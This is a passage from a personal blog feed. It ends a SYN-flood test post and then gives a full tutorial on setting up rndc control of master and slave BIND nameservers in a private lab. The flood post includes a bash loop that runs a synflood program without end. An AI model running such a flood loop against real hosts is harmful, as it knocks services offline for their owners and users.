<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'><span class="k">while</span> :
</span><span class='line'><span class="k">do</span>
</span><span class='line'>/path/to/synflood
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<h4>results</h4>

<p><img src="http://lin-credible.github.io/images/result_syn.jpg" alt="alt text" /><br />
<img src="http://lin-credible.github.io/images/flood_test.jpg" alt="alt text" /><br /></p>

<h4>more&#8230;&#8230;</h4>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Controlling the Nameserver]]></title>
    <link href="http://lin-credible.github.io/blog/2013/05/02/controlling-the-nameserver/"/>
    <updated>2013-05-02T14:24:00+08:00</updated>
    <id>http://lin-credible.github.io/blog/2013/05/02/controlling-the-nameserver</id>
    <content type="html"><![CDATA[<p>  Traditionally, administrators have controlled the BIND nameserver, named, with Unix signals. The nameserver interprets the receipt of certain
signals as instructions to take particular actions, such as reloading all the primary zones that have changed. However, there are a limited number
of signals available, and signals offer no means of passing along additional information such as the domain name of a particular zone to reload.</p>

<p>  In BIND 8.2, the ISC introduced a method of controlling the nameserver by sending messages to it on a special control channel. The control channel
can be either a Unix domain socket or a TCP port that the nameserver listens on for messages. Because the control channel isn&#8217;t limited to a finite
number of discrete signals, it&#8217;s more flexible and powerful. The ISC says that the control channel is the way of the future and that administrators
should use it, rather than signals, for all nameserver management.</p>

<p>  You send messages to a nameserver via the control channel using a program called ndc (in BIND 8) or rndc (in BIND 9). Prior to BIND 8.2, ndc was
simply a shell script that allowed you to substitute convenient arguments (such as reload) for signals (such as HUP).</p>

<pre><code>my test structure
</code></pre>

<p><img src="http://lin-credible.github.io/images/rndc.jpg" alt="alt text" /><br /></p>

<!-- more -->


<pre><code>my steps
</code></pre>

<h2>Master</h2>

<figure class='code'><figcaption><span>192.168.10.112/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc-confgen </span>
</span><span class='line'> <span class="sr">//</span> <span class="no">Start</span> <span class="n">of</span> <span class="n">rndc</span><span class="o">.</span><span class="n">conf</span>          <span class="sr">//</span> <span class="s2">&quot;//&quot;</span> <span class="o">&lt;-&gt;</span> <span class="s2">&quot;#&quot;</span>
</span><span class='line'> <span class="n">key</span> <span class="s2">&quot;rndc-key&quot;</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>         <span class="n">secret</span> <span class="s2">&quot;FOgSrUhEdprHOHlOgajsBQ==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'> <span class="n">options</span> <span class="p">{</span>
</span><span class='line'>         <span class="n">default</span><span class="o">-</span><span class="n">key</span> <span class="s2">&quot;rndc-key&quot;</span><span class="p">;</span>
</span><span class='line'>         <span class="n">default</span><span class="o">-</span><span class="n">server</span> <span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>         <span class="n">default</span><span class="o">-</span><span class="n">port</span> <span class="mi">953</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'> <span class="sr">//</span> <span class="no">End</span> <span class="n">of</span> <span class="n">rndc</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'>
</span><span class='line'> <span class="sr">//</span> <span class="no">Use</span> <span class="n">with</span> <span class="n">the</span> <span class="n">following</span> <span class="k">in</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span><span class="p">,</span> <span class="n">adjusting</span> <span class="n">the</span> <span class="n">allow</span> <span class="n">list</span> <span class="n">as</span> <span class="ss">needed</span><span class="p">:</span>
</span><span class='line'> <span class="sr">//</span> <span class="n">key</span> <span class="s2">&quot;rndc-key&quot;</span> <span class="p">{</span>
</span><span class='line'> <span class="sr">//</span>       <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'> <span class="sr">//</span>       <span class="n">secret</span> <span class="s2">&quot;FOgSrUhEdprHOHlOgajsBQ==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="sr">//</span> <span class="p">};</span>
</span><span class='line'> <span class="sr">//</span>
</span><span class='line'> <span class="sr">//</span> <span class="n">controls</span> <span class="p">{</span>
</span><span class='line'> <span class="sr">//</span>       <span class="n">inet</span> <span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span> <span class="n">port</span> <span class="mi">953</span>
</span><span class='line'> <span class="o">//</span>               <span class="n">allow</span> <span class="p">{</span> <span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="n">keys</span> <span class="p">{</span> <span class="s2">&quot;rndc-key&quot;</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'> <span class="sr">//</span> <span class="p">};</span>
</span><span class='line'> <span class="sr">//</span> <span class="no">End</span> <span class="n">of</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Generating the master_rndc.key with the standard output of the &#8220;rndc-confgen&#8221;.</h3>

<figure class='code'><figcaption><span>master_rndc.key - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># cat master_rndc.key |grep -v &quot;^#&quot;</span>
</span><span class='line'> <span class="n">key</span> <span class="s2">&quot;master_rndc-key&quot;</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>       <span class="n">secret</span> <span class="s2">&quot;FOgSrUhEdprHOHlOgajsBQ==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'> <span class="n">controls</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">inet</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span> <span class="n">port</span> <span class="mi">953</span>
</span><span class='line'>               <span class="n">allow</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">;</span> <span class="p">}</span> <span class="n">keys</span> <span class="p">{</span> <span class="s2">&quot;master_rndc-key&quot;</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Change the key file&#8217;s attributes</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> chown root:named master_rndc.key
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>named.conf/master - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'> <span class="o">[</span><span class="n">root</span><span class="vi">@master</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># vim named.conf</span>
</span><span class='line'> <span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span><span class='line'> <span class="kp">include</span> <span class="s2">&quot;/etc/master_rndc.key&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Then, restart the nameserver and check.</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>service named restart
</span><span class='line'>lsof -i:953
</span><span class='line'>netstat -ntpl |grep :953
</span></code></pre></td></tr></table></div></figure>


<h2>Slave</h2>

<figure class='code'><figcaption><span>192.168.10.111/slave - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@slave</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc-confgen </span>
</span><span class='line'><span class="sr">//</span> <span class="no">Start</span> <span class="n">of</span> <span class="n">rndc</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'><span class="n">key</span> <span class="s2">&quot;rndc-key&quot;</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>        <span class="n">secret</span> <span class="s2">&quot;0ul0jV/mjNh1vt0+Va4nfg==&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="n">options</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">default</span><span class="o">-</span><span class="n">key</span> <span class="s2">&quot;rndc-key&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">default</span><span class="o">-</span><span class="n">server</span> <span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="n">default</span><span class="o">-</span><span class="n">port</span> <span class="mi">953</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="sr">//</span> <span class="no">End</span> <span class="n">of</span> <span class="n">rndc</span><span class="o">.</span><span class="n">conf</span>
</span><span class='line'>
</span><span class='line'><span class="sr">//</span> <span class="no">Use</span> <span class="n">with</span> <span class="n">the</span> <span class="n">following</span> <span class="k">in</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span><span class="p">,</span> <span class="n">adjusting</span> <span class="n">the</span> <span class="n">allow</span> <span class="n">list</span> <span class="n">as</span> <span class="ss">needed</span><span class="p">:</span>
</span><span class='line'><span class="sr">//</span> <span class="n">key</span> <span class="s2">&quot;rndc-key&quot;</span> <span class="p">{</span>
</span><span class='line'><span class="sr">//</span>       <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'><span class="sr">//</span>       <span class="n">secret</span> <span class="s2">&quot;0ul0jV/mjNh1vt0+Va4nfg==&quot;</span><span class="p">;</span>
</span><span class='line'><span class="sr">//</span> <span class="p">};</span>
</span><span class='line'><span class="sr">//</span>
</span><span class='line'><span class="sr">//</span> <span class="n">controls</span> <span class="p">{</span>
</span><span class='line'><span class="sr">//</span>       <span class="n">inet</span> <span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span> <span class="n">port</span> <span class="mi">953</span>
</span><span class='line'><span class="o">//</span>               <span class="n">allow</span> <span class="p">{</span> <span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span><span class="p">;</span> <span class="p">}</span> <span class="n">keys</span> <span class="p">{</span> <span class="s2">&quot;rndc-key&quot;</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'><span class="sr">//</span> <span class="p">};</span>
</span><span class='line'><span class="sr">//</span> <span class="no">End</span> <span class="n">of</span> <span class="n">named</span><span class="o">.</span><span class="n">conf</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Generating the slave_rndc.key with the standard output of the &#8220;rndc-confgen&#8221;.</h3>

<figure class='code'><figcaption><span>slave_rndc.key - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@slave</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># cat slave_rndc.key  |grep -v &quot;^#&quot;</span>
</span><span class='line'> <span class="n">key</span> <span class="s2">&quot;slave_rndc-key&quot;</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>       <span class="n">secret</span> <span class="s2">&quot;0ul0jV/mjNh1vt0+Va4nfg==&quot;</span><span class="p">;</span>
</span><span class='line'> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'> <span class="n">controls</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">inet</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="n">port</span> <span class="mi">953</span>
</span><span class='line'>               <span class="n">allow</span> <span class="p">{</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">78</span><span class="p">;</span> <span class="p">}</span> <span class="n">keys</span> <span class="p">{</span> <span class="s2">&quot;slave_rndc-key&quot;</span><span class="p">;</span> <span class="p">};</span>
</span><span class='line'> <span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Same to the master, Here also need to change the key file&#8217;s attributes</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>chown root:named slave_rndc.key
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>named.conf/slave - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@slave</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># vim named.conf</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span><span class='line'><span class="kp">include</span> <span class="s2">&quot;/etc/slave_rndc.key&quot;</span><span class="p">;</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span><span class="o">.</span><span class="n">.</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Then, restart the nameserver and check.</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>service named restart
</span><span class='line'>netstat -ntpl |grep 953
</span></code></pre></td></tr></table></div></figure>


<h2>Controller</h2>

<h3>prepare</h3>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>yum install -y <span class="nb">bind</span>
</span><span class='line'>which rndc
</span></code></pre></td></tr></table></div></figure>


<h3>make the rndc.conf file</h3>

<figure class='code'><figcaption><span>rndc.conf/controller - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">named</span><span class="o">]</span><span class="c1"># vim /etc/rndc.conf</span>
</span><span class='line'><span class="n">key</span> <span class="s2">&quot;master_rndc-key&quot;</span> <span class="p">{</span>                        <span class="sr">//</span><span class="no">The</span> <span class="n">first</span> <span class="n">part</span> <span class="n">of</span> <span class="n">the</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="n">_rndc_confgen</span><span class="s1">&#39;s output. Notice!</span>
</span><span class='line'><span class="s1">        algorithm hmac-md5;</span>
</span><span class='line'><span class="s1">        secret &quot;FOgSrUhEdprHOHlOgajsBQ==&quot;;</span>
</span><span class='line'><span class="s1">};</span>
</span><span class='line'><span class="s1">key &quot;slave_rndc-key&quot; {                       //The first part of the 192.168.10.111_rndc_confgen&#39;</span><span class="n">s</span> <span class="n">output</span><span class="o">.</span> <span class="no">Notice</span><span class="o">!</span>
</span><span class='line'>        <span class="n">algorithm</span> <span class="n">hmac</span><span class="o">-</span><span class="n">md5</span><span class="p">;</span>
</span><span class='line'>        <span class="n">secret</span> <span class="s2">&quot;0ul0jV/mjNh1vt0+Va4nfg==&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="n">options</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">default</span><span class="o">-</span><span class="n">key</span> <span class="s2">&quot;master_rndc-key&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="n">default</span><span class="o">-</span><span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span><span class="p">;</span>
</span><span class='line'>        <span class="n">default</span><span class="o">-</span><span class="n">port</span> <span class="mi">953</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">112</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">key</span> <span class="s2">&quot;master_rndc-key&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="n">server</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">111</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">key</span> <span class="s2">&quot;slave_rndc-key&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<h3>rndc help</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@controller named]# rndc -h
</span><span class='line'>Usage: rndc [-b address] [-c config] [-s server] [-p port]
</span><span class='line'>        [-k key-file ] [-y key] [-V] command
</span><span class='line'>
</span><span class='line'>command is one of the following:
</span><span class='line'>
</span><span class='line'>  reload        Reload configuration file and zones.
</span><span class='line'>  reload zone [class [view]]
</span><span class='line'>                Reload a single zone.
</span><span class='line'>  refresh zone [class [view]]
</span><span class='line'>                Schedule immediate maintenance for a zone.
</span><span class='line'>  retransfer zone [class [view]]
</span><span class='line'>                Retransfer a single zone without checking serial number.
</span><span class='line'>  freeze        Suspend updates to all dynamic zones.
</span><span class='line'>  freeze zone [class [view]]
</span><span class='line'>                Suspend updates to a dynamic zone.
</span><span class='line'>  thaw          Enable updates to all dynamic zones and reload them.
</span><span class='line'>  thaw zone [class [view]]
</span><span class='line'>                Enable updates to a frozen dynamic zone and reload it.
</span><span class='line'>  notify zone [class [view]]
</span><span class='line'>                Resend NOTIFY messages for the zone.
</span><span class='line'>  reconfig      Reload configuration file and new zones only.
</span><span class='line'>  sign zone [class [view]]
</span><span class='line'>                Update zone keys, and sign as needed.
</span><span class='line'>  loadkeys zone [class [view]]
</span><span class='line'>                Update keys without signing immediately.
</span><span class='line'>  stats         Write server statistics to the statistics file.
</span><span class='line'>  querylog      Toggle query logging.
</span><span class='line'>  dumpdb [-all|-cache|-zones] [view ...]
</span><span class='line'>                Dump cache(s) to the dump file (named_dump.db).
</span><span class='line'>  secroots [view ...]
</span><span class='line'>                Write security roots to the secroots file.
</span><span class='line'>  stop          Save pending updates to master files and stop the server.
</span><span class='line'>  stop -p       Save pending updates to master files and stop the server
</span><span class='line'>                reporting process id.
</span><span class='line'>  halt          Stop the server without saving pending updates.
</span><span class='line'>  halt -p       Stop the server without saving pending updates reporting
</span><span class='line'>                process id.
</span><span class='line'>  trace         Increment debugging level by one.
</span><span class='line'>  trace level   Change the debugging level.
</span><span class='line'>  notrace       Set debugging level to 0.
</span><span class='line'>  flush         Flushes all of the server's caches.
</span><span class='line'>  flush [view]  Flushes the server's cache for a view.
</span><span class='line'>  flushname name [view]
</span><span class='line'>                Flush the given name from the server's cache(s)
</span><span class='line'>  status        Display status of the server.
</span><span class='line'>  recursing     Dump the queries that are currently recursing (named.recursing)
</span><span class='line'>  tsig-list     List all currently active TSIG keys, including both statically
</span><span class='line'>                configured and TKEY-negotiated keys.
</span><span class='line'>  tsig-delete keyname [view]
</span><span class='line'>                Delete a TKEY-negotiated TSIG key.
</span><span class='line'>  validation newstate [view]
</span><span class='line'>                Enable / disable DNSSEC validation.
</span><span class='line'>  addzone ["file"] zone [class [view]] { zone-options }
</span><span class='line'>                Add zone to given view. Requires new-zone-file option.
</span><span class='line'>  delzone ["file"] zone [class [view]]
</span><span class='line'>                Removes zone from given view. Requires new-zone-file option.
</span><span class='line'>  *restart      Restart the server.
</span><span class='line'>
</span><span class='line'>* == not yet implemented
</span><span class='line'>Version: 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6_4.4</span></code></pre></td></tr></table></div></figure>


<h3>control the nameserver</h3>

<figure class='code'><figcaption><span>control it - awesome.rb </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.112 status</span>
</span><span class='line'><span class="ss">version</span><span class="p">:</span> <span class="mi">9</span><span class="o">.</span><span class="mi">8</span><span class="o">.</span><span class="mi">2</span><span class="n">rc1</span><span class="o">-</span><span class="no">RedHat</span><span class="o">-</span><span class="mi">9</span><span class="o">.</span><span class="mi">8</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="mi">0</span><span class="o">.</span><span class="mi">17</span><span class="o">.</span><span class="n">rc1</span><span class="o">.</span><span class="n">el6_4</span><span class="o">.</span><span class="mi">4</span> <span class="p">(</span><span class="no">None</span> <span class="n">of</span> <span class="n">your</span> <span class="n">business</span><span class="p">)</span>
</span><span class='line'><span class="no">CPUs</span> <span class="ss">found</span><span class="p">:</span> <span class="mi">1</span>
</span><span class='line'><span class="n">worker</span> <span class="ss">threads</span><span class="p">:</span> <span class="mi">1</span>
</span><span class='line'><span class="n">number</span> <span class="n">of</span> <span class="ss">zones</span><span class="p">:</span> <span class="mi">36</span>
</span><span class='line'><span class="n">debug</span> <span class="ss">level</span><span class="p">:</span> <span class="mi">0</span>
</span><span class='line'><span class="n">xfers</span> <span class="ss">running</span><span class="p">:</span> <span class="mi">0</span>
</span><span class='line'><span class="n">xfers</span> <span class="ss">deferred</span><span class="p">:</span> <span class="mi">0</span>
</span><span class='line'><span class="n">soa</span> <span class="n">queries</span> <span class="k">in</span> <span class="ss">progress</span><span class="p">:</span> <span class="mi">0</span>
</span><span class='line'><span class="n">query</span> <span class="n">logging</span> <span class="n">is</span> <span class="no">OFF</span>
</span><span class='line'><span class="n">recursive</span> <span class="ss">clients</span><span class="p">:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">0</span><span class="o">/</span><span class="mi">1000</span>
</span><span class='line'><span class="n">tcp</span> <span class="ss">clients</span><span class="p">:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">100</span>
</span><span class='line'><span class="n">server</span> <span class="n">is</span> <span class="n">up</span> <span class="ow">and</span> <span class="n">running</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.112 reload</span>
</span><span class='line'><span class="n">server</span> <span class="n">reload</span> <span class="n">successful</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span><span class="n">root</span><span class="vi">@controller</span> <span class="n">etc</span><span class="o">]</span><span class="c1"># rndc -s 192.168.10.111 reload</span>
</span><span class='line'><span class="n">server</span> <span class="n">reload</span> <span class="n">successful</span>
</span><span class='line'>
